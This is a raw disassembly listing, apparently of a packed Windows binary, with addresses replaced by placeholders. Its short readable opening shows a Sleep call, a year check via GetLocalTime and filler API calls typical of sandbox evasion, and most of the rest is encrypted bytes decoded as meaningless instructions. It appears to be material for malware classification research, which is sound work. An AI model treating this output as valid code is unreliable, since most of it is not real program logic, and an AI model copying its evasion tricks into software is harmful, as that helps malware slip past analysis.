jb r-xdata
inc ebp
and al 0x85
lodsb [ esi ]
or ah [ edi + 0x11 ]
sbb eax 0x51350b1d
sbb eax 0x7272721d
mov esp 0x1d51740b
sbb eax 0x9f6b1d88
sbb cl [ ebx ]
lea ecx [ edi ]
sbb eax 0xb0b5b41d
pop esp
nop
nop
push 0x12
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
test [ edx ] al
jb r-xdata
inc esi
jb r-xdata
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_458470
mov [ rw-data ] eax
cmp [ rw-data ] 0x15
jbe r-xdata
nop
push 0x0
call sub_4584f0
nop
nop
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
call sub_403174
add [ eax ] al
jb r-xdata
jb r-xdata
imul esp [ esi + edx * 4 + 0x1d22b90a ] 0x1d
mov al [ ebx ]
loopne r-xdata
add [ edx + eax - 0x1b980000 ] 0x1b
inc esi
add al ch
retn 0xfa7c
jb r-xdata
mov [ eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push ebx
or esp [ ebx + 0x721d1d0e ]
jb r-xdata
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
add al [ eax ]
jb r-xdata
imul eax [ edx ] 0x0
add [ eax - 0x17ff9570 ] dl
cli
jle r-xdata
jb r-xdata
add [ eax - 0x1c ] ch
sbb eax [ esi ]
jb r-xdata
push 0x0
call GetTextColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
je r-xdata
[ edx ]
movsb [ edi ] [ esi ]
xchg esi eax
or bh [ ecx - 0x75e2e2de ]
add esp eax
and eax 0xea30b53
sub_45a552
loop r-xdata
in eax dx
0xffffe2e2 0x88e2
jb r-xdata
imul ebp [ edi - 0x1b70f416 ] 0x7272e2e2
in eax dx
in eax dx
mov dx 0x1d18
sbb eax 0xe905818a
jae r-xdata
loop r-xdata
or al [ eax - 0x75e2e2e1 ]
dec ecx
pop ss
pop ds
sbb eax 0xc7570b1d
jb r-xdata
lahf
fidiv [ ecx + 0x1d18ff0b ]
sbb eax 0xa727272
sbb eax 0x17498a1d
outsd
cmpsd [ esi ] [ edi ]
mov dl 0xb
jmp r-xdata
jb r-xdata
salc
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
movsb [ edi ] [ esi ]
out dx al
jb r-xdata
jb r-xdata
sbb eax 0x2267bb1d
in eax dx
[ eax ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
in eax dx
call 0xffffffffdc288802
jb r-xdata
jb r-xdata
lahf
adc al 0x84
imul esi [ edi + 0xb8b88be ] 0xffffffa8
test [ ebx - 0x61 ] ch
sbb cl [ eax + 0x1fe30bb4 ]
sbb eax 0x7272721d
jb r-xdata
sub eax 0xe2cd1c0b
loop r-xdata
or ah [ edi + 0x1e ]
jb r-xdata
cli
loop r-xdata
test [ ebx - 0x59 ] ch
adc al 0xb
insb
in al dx
loop r-xdata
loop r-xdata
mov edx 0x14a76b84
or ebp [ esp + ebp * 8 - 0x1e ]
dec ebp
jb r-xdata
imul edi [ edx ] 0x66ed3967
fist [ ebx ]
scasd [ edi ]
test [ edx ] 0x6
retn 0xe2e2
or al [ esi ]
jb r-xdata
and al 0xca
imul esp [ edx + ebp * 8 + 0x1d1e310a ] 0x1d
mov bl [ edx ]
push ds
mov dl 0x1d
loop r-xdata
jb r-xdata
xchg esi eax
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
adc ebx [ 0xffffffff8ae6881d ]
mov ah 0x82
mov dl 0x71
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jne r-xdata
jb r-xdata
loop r-xdata
fist [ ecx ]
sbb eax 0x7272721d
cdq
jb r-xdata
mov ecx 0x72e2e2d6
mov dl 0xb
inc esi
cmp eax 0x22d11d1d
and [ edx + 0x72 ] esi
jb r-xdata
adc cl cl
jb r-xdata
jb r-xdata
jno r-xdata
loop r-xdata
loop r-xdata
mul edx
imul edi [ edi - 0x60947bfc ] 0x14
test [ ebx - 0x49 ] ch
mov esi 0xa80b8b88
jb r-xdata
mov bl cl
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
xchg edi eax
sbb eax 0xe2e21675
loop r-xdata
loop r-xdata
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
jb r-xdata
or esi [ esi ]
jb r-xdata
mov [ ebx - 0x1d1d80f5 ] cl
jb r-xdata
sbb eax 0x1e971d1d
cmp ebp ebp
fist [ ebx ]
scasb [ edi ]
add ebx [ 0x1d72721d ]
mov ch 0x1d
je r-xdata
adc ebx [ 0x1e971d1d ]
mov cl 0xb
fstp [ esi ]
sbb eax 0x7272721d
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata

sbb ah [ edi + 0x1d ]
in eax dx

sbb eax 0xe2e26a74
cmpsd [ esi ] [ edi ]
mov dl 0x8a
in al 0xe2
loopne r-xdata
std
loop r-xdata
sbb eax 0x990bf2b5
outsd
loop r-xdata
mov esp 0x72212bb9
push edi
sahf
pop ds
mov [ 0xffffffffe2fad70b ] al
loop r-xdata
push cs
pop ds
sbb eax 0xe38ab21d
loop r-xdata
sbb eax 0xaf69ee97
0xe2e48f0b 0x72e2
or ecx [ edi ]
pop ss
sbb eax 0x6469721d
jb r-xdata
mov cl [ ebp - 0x2a ]
or edi [ edi - 0x1e ]
jb r-xdata
in eax dx
jb r-xdata
popad
push cs
out dx al
mov cl 0xb5
and ch ch
inc bp
add bl [ 0x2aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh [ esi - 0x10 ]
loop r-xdata
pop ax
jb r-xdata
pop esi
loop r-xdata
jb r-xdata
or eax esp
jb r-xdata
mov cl 0x6f
and ch ch
jb r-xdata
jb r-xdata
or ebx [ ecx + 0x72e2e2fd ]
jb r-xdata
jb r-xdata
loop r-xdata
bound ebp [ ebx - 0x41 ]
sbb eax 0xe2e21a75
sbb eax 0x88ee2661
loop r-xdata
loop r-xdata
sbb eax 0x13cb66ed
sbb eax 0x8ae6881d
or edx esi
fsub st2
loop r-xdata
jb r-xdata
out dx al
sub esp [ ecx ]
jb r-xdata
or edx [ eax + 0x72e2e2c2 ]
jb r-xdata
xor eax 0xa4e2e2d4
jb r-xdata
or ch [ ebx ]
sbb [ 0xdb88a1d ] bl
and ch ch
dec edx
or al [ ebp - 0x10 ]
loop r-xdata
outsd
scasd [ edi ]
cmp ch [ edi - 0x59 ]
and cl [ bp + di ]
test dl bl
loop r-xdata
loop r-xdata
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xd1
and cl [ eax + 0x39f0ba6 ]
sbb eax 0xeb18611d
loop r-xdata
jb r-xdata
shl dl 0x1
jb r-xdata
out dx al
jb r-xdata
loop r-xdata
mov ecx [ ebx ]
xchg edi eax
out dx al
mov dl 0xb
jb r-xdata
push edx
in al 0xe2
loop r-xdata
or esp [ edx + ecx * 8 ]
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
or edx [ edi + 0xa721d1d ]
arpl cx di
loop r-xdata
dec ecx
jb r-xdata
inc ebp
mov bh 0x69
push cs
or edx [ ebx ]
jmp 0xffffffff93638aa2
or ebp [ esi + 0x721d1d03 ]
jb r-xdata
imul ebx [ edx ] 0x66ed1d67

cmpsd [ esi ] [ edi ]
mov cl 0xb2
popad
out dx al
or edx [ edx - 0x1c ]
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
movhps [ 0x6469721d ] xmm3
mov eax 0xe2d8d60b
jb r-xdata
jb r-xdata
mov dl 0xb
loop r-xdata
mov bl [ esi + 0x39 ]
jb r-xdata
adc al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0xe2e9130b
loop r-xdata
mov dl dh
mov dl 0xa
std
add ebx [ 0xffffffffee26611d ]
or esi edx
call 0x6e5189b6
cmp eax 0x72721d1d
jb r-xdata
mov [ esi + 0x1d15d60b ] al
loop r-xdata
jb r-xdata
jb r-xdata
outsd
popad
fild [ edx + 0xbe2e208 ]
push ebx
cmp al 0x1d
sbb eax 0x72727272
out dx al
jb r-xdata
jb r-xdata
mov ch 0x6b
pop esp
loop r-xdata
cmp [ ecx + 0x5f ] ecx
jb r-xdata
test [ ebx - 0x51 ] ch
push ds
push 0xffcf
in eax dx
jb r-xdata
salc
jb r-xdata
adc al 0xed
jb r-xdata
sbb eax 0x1269311d
xchg ebx eax
push ds
or esp ecx
shl dl 0x1
loop r-xdata
out dx al
jb r-xdata
push cs
popad
push cs
mov [ ebx - 0x7b6b7746 ] al
imul esp [ edi - 0x37f445ee ] 0x12
sbb eax 0x8872721d
retn 0xd80b
jl r-xdata
sbb eax 0xed1a9fdb
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
pop edi
jb r-xdata
loop r-xdata
push 0xffffffcf
jb r-xdata
test [ ebx - 0x41 ] ch
add al 0x84
imul ebx [ edi - 0x48947bec ] 0xffffffbe
mov [ ebx - 0x1d0857f5 ] cl
jb r-xdata
salc
jb r-xdata

jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ si ] [ di ]
lahf
jb r-xdata
jb r-xdata
add bl [ 0x3aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
pop eax
xor eax 0xa4e2e2d4
test [ ebx - 0x59 ] ch
push ss
jg r-xdata
jb r-xdata
iretd
push cs
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x51 ] ch
sbb al 0xbb
imul ebp [ edx ] 0x1eaf6b84
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + ebp * 8 - 0x1e ]
loop r-xdata
imul ebp esi 0xfffffff4
or ebx [ edi + 0x721d1d16 ]
in eax dx
push ss
shl edx 0x1
loop r-xdata
loop r-xdata
sbb eax 0xd6e90bb2
mov cl 0x6f
jb r-xdata
loop r-xdata
jb r-xdata
or eax 0x850b0fbd
loopne r-xdata
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edx + esi * 4 + 0x1d18610a ] 0x1d
or eax [ eax + 0x5be2e2d7 ]
imul esp [ edi - 0x387745f8 ] 0xffffff84
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x3d7745f4 ] 0xffffff84
imul esp [ edi - 0x13b6f4ee ] 0xffffffe2
loop r-xdata
jb r-xdata
or dh dl
mov cl 0xb2
jb r-xdata
mov ch 0x69
sbb dl cl
cmp [ ebx ] ecx
outsb
jb r-xdata
loop r-xdata
test eax esp
mov ebp 0xe0850b0f
sub ebx [ eax ]
sbb eax 0xdb88a1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
sbb eax 0xc2887272
or ebx eax
mov ebp 0x72727221
jb r-xdata
bound ebx [ bx ]
jb r-xdata
pop esi
jb r-xdata
loop r-xdata
push ds
sbb eax 0xe90bb21d
cmp ecx esi
loop r-xdata
or [ edx + 0x6b84c788 ] bh
cmpsd [ esi ] [ edi ]
push cs
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov dl al
test [ ebx - 0x59 ] ch
adc cl [ ebx ]
dec ecx
in al dx
test [ ebx - 0x59 ] ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
mov dl 0xa
popad
sbb [ 0xffffffffd7800b1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x88f20e61
cmp [ edx + 0x6b849488 ] 0xffffffa7
adc bh [ edx + 0x1d12c80b ]
mov [ eax + 0x6b843c69 ] dl
mov edi 0xd2800bb0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ebp [ ebx ]
and [ edx + 0x72 ] esi
mov esp 0x72e2e2c1
jb r-xdata
out dx al
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
hlt
test [ ecx - 0x26 ] ah
loop r-xdata
sbb eax 0x740bb21d
in al dx
pop ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
jb r-xdata
mov ah 0xb5
imul ebx [ edx ] 0x6e0b39d1
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbe2e2e2
pop ebx
add ebx [ 0xffffffffee26611d ]
jb r-xdata
loop r-xdata
and ebp ebp
imul esp [ edi - 0x6e7745fe ] 0xffffff84
imul esp [ edi - 0x20f44600 ] 0xffffffec
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbb0bf6b
jb r-xdata
or bh cl
cli
jb r-xdata
mov ebx 0xe2ff770b
loop r-xdata
jb r-xdata
salc
popad
mov ch 0xa
xchg [ 0xffffffff8e861aa7 ] esp
jb r-xdata
imul edx [ edx ] 0xe2d5cd0b
loop r-xdata
sbb eax 0xec740bb2
pop ss
fldenv [ ecx ]
in eax dx
imul ecx [ esi ] 0xb1ee0e61
mov ch 0xb
sbb eax 0x1a9fdb1d
in eax dx
jb r-xdata
jb r-xdata
int 0xd5
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x1ab76b16 ] 0x69
jb r-xdata
outsd
jb r-xdata
scasd [ edi ]
jb r-xdata
mov eax [ edi - 0x79e558db ]
jb r-xdata
loop r-xdata
aad 0xe2
mov dl 0x6f
sbb eax 0xbee2661
jb r-xdata
mov ch 0xae
or eax eax
add [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
outsd
test [ ebx - 0x49 ] ch
sub ch [ ecx + 0x32 ]
test [ ebx - 0x49 ] ch
mov ch 0x6f
adc dl 0xe2
test [ ebx - 0x41 ] ch
mov al 0xb
mov dl 0x6b
mov edi 0xe3b20b1e
loop r-xdata
or esi [ edi - 0x1 ]
sbb eax 0xceb41db2
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
inc eax
or al [ ebp + 0x611d1d3c ]
out dx al
ja r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb al [ esi + 0xbcc8e8e ]
add ecx [ edx ]
sbb eax 0xb2b3721d
test [ ebx - 0x49 ] ch
add bh [ eax + 0xb76b84 ]
shl [ eax ] 0x1
or edx [ edx + 0x72e2e2fa ]
jb r-xdata
imul esp [ esi + edx * 8 - 0x1d168ef5 ] 0x727272e2
jb r-xdata
or [ 0xb22d11d ] ebx
mov [ 0x721d1d09 ] eax
jb r-xdata
fistp [ edi - 0x589812e6 ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
mov dl 0xb
jmp 0x73288b13
outsd
push ss
jb r-xdata
loop r-xdata
in eax dx
sbb eax 0xff180b1d
loop r-xdata
sub bl [ edi ]
jb r-xdata
mov ah 0xce
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
jb r-xdata
and eax 0x8e861aa7
jb r-xdata
out dx al
sbb [ eax + 0x1e6c0b80 ] cl
jb r-xdata
nop
or esp [ edi ]
and [ edx + 0x72 ] esi
sbb eax 0x72727272
mov ah dl
loop r-xdata
mov bh 0x10
mov eax 0x6b848e88
outsd
sub dx di
loop r-xdata
jb r-xdata
popad
test [ es : ebx ] 0x2b
aad 0xe2
loop r-xdata
mov dl dh
outsd
cmpsd [ esi ] [ edi ]
push es
mov cl 0xb
pop ecx
jmp r-xdata
mov dl 0xa
test [ ebx - 0x11d99ee3 ] edi
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jmp edx
loop r-xdata
jb r-xdata
imul esp [ edi + 0x16a725ea ] 0x878b8091
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ edi + 0x6b84b802 ] 0xffffffb7
add cl dl
xor [ ebx ] cl
xchg edx eax
cli
loop r-xdata
salc
jb r-xdata
sbb ch ch
mov cl 0xb1
jb r-xdata
jb r-xdata
mov bh 0x1a
jb r-xdata
cmpsd [ esi ] [ edi ]
xor ah ch
loop r-xdata
sbb eax 0x676feab4
pop esi
sbb [ 0xffffffffb41db21d ] bl
shl [ edx ] 0x1
mov [ 0xffffffffe2fa270b ] al
mul edx
loop r-xdata
xchg edi eax
push cs
push ds
sbb ch [ ecx - 0x59 ]
jb r-xdata
sbb eax 0x72212b1d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esi [ edx ] 0x28b76b84
mov [ esi + 0x2ab76b84 ] cl
mov edi 0x6366ed1e
mov ch 0xb
daa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
0x9116a725 0x8b80
sahf
pop ds
sbb eax 0x530bb21d
iretd
pop edx
jb r-xdata
jmp 0x72b88c03
loop r-xdata
jb r-xdata
jno r-xdata
jb r-xdata
outsd
jb r-xdata
or esi [ ecx - 0x17 ]
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
0x1f9e676f 0x1d1d
cmpsd [ esi ] [ edi ]
jb r-xdata
mov dl 0xa
jb r-xdata
sub esp [ ecx ]
jb r-xdata
sbb eax 0x4b0b1697
jb r-xdata
mov ah 0xb2
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
bound ebx [ edi ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
jb r-xdata
cmp ebx [ 0x7272721d ]
jb r-xdata
fstp [ esi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
push ss
jb r-xdata
loop r-xdata
mov ch 0x1d
jb r-xdata
sbb eax 0xa340b1d
jb r-xdata
jb r-xdata
loop r-xdata
cmp al 0x84
imul edi [ edi - 0x2d7ff450 ] 0xffffffe2
jb r-xdata
stc
or [ ebx + 0x1aa72587 ] 0x86
in eax dx
xchg ecx eax
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push es
jb r-xdata
or bl ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
sbb eax 0xa340b1d
jb r-xdata
or bl bl
jb r-xdata
0xbc16b8a 0xf9e2
jb r-xdata
push cs
dec ebx
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
sbb eax 0x1d0a340b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
imul edi [ edi - 0x1c4df4e2 ] 0xffffffe2
loop r-xdata
or esp [ ebx - 0x3 ]
loop r-xdata
or bl [ 0xffffffffb2b3721d ]
jb r-xdata
out dx al
loop r-xdata
jb r-xdata
imul esp [ edi + 0xaa76b1a ] 0xb16a769
jb r-xdata
or ch [ ecx - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
fadd st6
jb r-xdata
jb r-xdata
inc ebp
stc
or esi [ edx + ecx ]
or al [ esi + edi + 0x1d ]
sbb eax 0xb1ee2661
mov al ah
imul eax ecx 0xb
jb r-xdata
mov ah dh
jecxz r-xdata
pop edx
or esi [ ecx - 0x3f ]
dec esi
call 0x72b88dde
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x3a69eeb5
popad
sbb [ 0x15bb67ed ] ebx
sbb eax 0xb22d11d
inc esp
sbb eax 0xee26611d
mov cl 0x88
loopne r-xdata
mov eax 0x1d3e310b
imul esi [ edi - 0x717747f0 ] 0xffffff84
imul esi [ edi - 0x7bcd96d6 ] 0x6b
mov bh 0x28
jb r-xdata
mov edi 0x16af6b1e
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
call 0x7262c6dd
imul esp [ edi + 0x16a7690a ] 0xb
jb r-xdata
loop r-xdata
jb r-xdata
cmp eax 0x86611d1d
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp edx
jb r-xdata
rcl eax 0x1
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
or bl [ ebx ]
shl edx cl
loop r-xdata
cmpsd [ esi ] [ edi ]
0xe06a0e63 0xe2e2
mov esi 0x72e2e2f6
jb r-xdata
mov ch 0xee
imul edi [ edx ] 0xed1d1961
mov ebx 0xd11d1d15
and cl [ ebx ]
jb r-xdata
jb r-xdata
or esp [ 0x721d1d1f ]
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] ebx
xchg dh al
jb r-xdata
jb r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
imul esp [ edi + 0x6a0e63ea ] 0xbe2e2e0
or dl [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov cl 0x88
jb r-xdata
stc
jb r-xdata
and eax 0x721d1d1f
jb r-xdata
jb r-xdata
inc edx
pop ds
jb r-xdata
sbb eax 0x1db5b2b4
arpl bp ax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi + 0x16af6b1e ] 0x6b
imul esp [ edi + 0xee80b16 ] 0x72721d1d
jb r-xdata
jb r-xdata
push ss
cmpsd [ esi ] [ edi ]
jb r-xdata
mov [ edx + 0x14af6b84 ] bl
jb r-xdata
jb r-xdata
mov dh 0xe2
jb r-xdata
sbb [ 0x6bb4bb1d ] ebx
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
sar [ edx ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and dh [ ebp + esi * 4 + 0x6b1ea76b ]
jb r-xdata
sbb eax 0x1d0ba291
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
into
jb r-xdata
jb r-xdata
or ebp eax
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
or eax ecx
jb r-xdata
loop r-xdata
sbb eax 0xa66bb4bb
or edi [ esi + 0x721d1d01 ]
cmpsb [ esi ] [ edi ]
sbb eax 0x6bb4bb1d
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa725721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ah bl
push ds
imul esp [ edi + 0x1aa76b16 ] 0xb
jb r-xdata
jge r-xdata
mov ah 0xb5
imul esp [ edi + 0x16a76b1e ] 0x6b
jb r-xdata
mov [ 0xffffffffe2fb1d0b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b21d
imul ebp [ edi + 0x6b84bb1a ] 0xffffffaf
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
or eax [ eax + 0x72e2e2d2 ]
jb r-xdata
jb r-xdata
arpl bp ax
sbb eax 0xe2e20674
sub bl [ bx ]
jb r-xdata
jb r-xdata
push cs
sbb eax 0x7272721d
in eax dx
mov dl 0x88
jecxz r-xdata
jb r-xdata
adc al 0x69
sub cl [ ebx ]
hlt
scasd [ edi ]
jb r-xdata
cmp bl [ 0xffffffffa725721d ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2f73e0b
loop r-xdata
mul edx
jb r-xdata
mov esi 0x721d1d01
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
pop ds
outsd
cmpsd [ esi ] [ edi ]
xor dh [ edx + esi * 4 + 0x1d3edb0a ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
jb r-xdata
sub bl [ edi ]
sbb eax 0x4e676f1d
adc al 0x1d
sbb eax 0xe2f8960a
loop r-xdata
test [ ebx - 0x61 ] ch
outsd
jb r-xdata
sbb eax 0x72e2e2fb
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
or ecx [ esi - 0x18 ]
sub [ eax + 0x1d3e310b ] bh
loop r-xdata
out 0x6f al
cmpsd [ esi ] [ edi ]
sub dh [ edx - 0x1d1379f5 ]
loop r-xdata
mov cl 0xb1
jb r-xdata
pop ds
sbb eax 0xab50e97
in ax 0xe2
loop r-xdata
jb r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
jb r-xdata
fdivr st7
loop r-xdata
xchg esi eax
xor al 0xe3
imul ebp [ edx ] 0x1d1ff40b
sbb eax 0x72727272
jb r-xdata
sbb eax 0x1ea72572
jb r-xdata
or ah dl
sbb eax 0x751db21d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x69727272
jb r-xdata
jb r-xdata
sbb eax 0x6f6fb21d
push esi
sbb bl [ 0x3b9c0a1d ]
movsw [ edi ] [ esi ]
salc
loop r-xdata
or eax [ ebx + ecx + 0x66ed1d1d ]
and edi [ 0xffffffff86611d1d ]
sub cl [ ebx ]
aam 0xce
loop r-xdata
popad
imul esp [ edi + 0x1f7d0b1a ] 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
imul ebx [ edi + 0xb1c6912 ] 0x7d
cli
loop r-xdata
jb r-xdata
or ebx [ 0x72e2e2fb ]
jb r-xdata
mov edi 0x72727221
jb r-xdata
and al 0xa7
push cs
or edx ecx
or edx [ eax ]
call 0x72b88c4c
imul esp [ edi - 0xc81f4ea ] 0x7272e2e2
jb r-xdata
jb r-xdata
jb r-xdata
and ebp ebp
jb r-xdata
jb r-xdata
or ecx [ ecx - 0x3c ]
scasd [ edi ]
push ss
mov ebx 0x6b849a88
jb r-xdata
or esi esp
jb r-xdata
and eax 0xe2e31ea7
mov dl 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xab76f72
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
sbb cl [ ebx ]
mov ch dl
or dl [ esi + 0x69e2e2f8 ]
jb r-xdata
sti
jb r-xdata
0xb16971d 0xe4b
jb r-xdata
shl edx 0xe2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
out 0xc6 al
jb r-xdata
mov dl 0x6f
jb r-xdata
jb r-xdata
mov al al
jb r-xdata
outsd
jb r-xdata
pop ds
sbb eax 0x7272721d
mov ebx 0x66ed2267
xchg al bh
loop r-xdata
mov edx 0x9c0bc788
loop r-xdata
jne r-xdata
jb r-xdata
push ds
dec ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e20274
jb r-xdata
popfd
cmp [ 0xe120b1d ] bl
or bl [ edi + 0x18 ]
outsd
jb r-xdata
arpl [ esi ] cx
sbb eax 0x1a61bb1d
jecxz r-xdata
je r-xdata
sbb eax 0xe2e24e74
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
loop r-xdata
jb r-xdata
mov al ah
outsd
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xbc0bfa97
in al dx
loop r-xdata
jb r-xdata
mov cl 0xb
adc al 0xc1
loop r-xdata
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
jmp edx
mov bl ah
or ebx eax
loop r-xdata
or esi [ ebx ]
loop r-xdata
sbb [ 0x751db21d ] ebx
mov dl 0x6f
and dh [ edx - 0x27f41c78 ]
cmp al 0xb
push esi
shl [ edx ] 0x1
mov [ 0xffffffffe2f8bc0b ] al
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xor cl [ ebx ]
mul edx
shl al cl
loop r-xdata
push cs
sbb eax 0x1ec10a1d
mov bh 0xea
outsd
sub bl [ bx ]
jb r-xdata
mov ah 0xb
xor al 0xc2
mov [ ebx + ecx + 0x1d1d10a7 ] dl
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
or cl [ edx ]
jb r-xdata
mov cl 0xb4
pop esp
into
loop r-xdata
loop r-xdata
mov edi 0x721d1d3b
jb r-xdata
adc ch [ ecx + 0x1c ]
or edi [ ebp - 0x6 ]
lahf
mov ebx 0x67ed2267
mov ah 0x3d
jb r-xdata
or ecx [ ebx + 0xe ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esi + 0x10af6b84 ] dl
mov ebx 0x6b84cc88
sbb eax 0xe2e24675
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bh [ ebx + ecx - 0x1d1d104c ]
